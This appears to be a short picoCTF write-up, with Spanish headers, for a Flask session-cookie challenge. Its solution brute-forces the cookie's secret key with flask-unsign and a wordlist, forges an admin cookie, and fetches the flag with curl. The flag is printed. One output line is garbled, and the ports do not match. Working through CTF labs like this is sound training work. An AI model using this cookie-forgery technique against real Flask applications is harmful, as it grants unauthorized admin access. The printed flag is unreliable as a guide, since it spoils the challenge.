## Descripción 
I forgot Cookies can Be modified Client-side, so now I decided to encrypt them! [http://mercury.picoctf.net:15614/](http://mercury.picoctf.net:15614/)
## Hints
1. [https://en.wikipedia.org/wiki/Homomorphic_encryption](https://en.wikipedia.org/wiki/Homomorphic_encryption)
2. The search endpoint is only helpful for telling you if you are admin or not, you won't be able to guess the flag name
## Solución
```
 flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aNggiQ.ogihacOQOnqOvbxYxqOli0XpM6o" --wordlist cookies.txt 
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'

flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNghfw.laCS90soyQTr6ADLh4OL3VvlAF4

                                                             
└─$ curl -s http://mercury.picoctf.net:35697/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aNgi8A.BbTVV1hRm6P_SaVRq7dkneozQWo" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_22fe0842}</code></p>

```
## Notas

## Referencias
[https://en.wikipedia.org/wiki/Homomorphic_encryption](https://en.wikipedia.org/wiki/Homomorphic_encryption)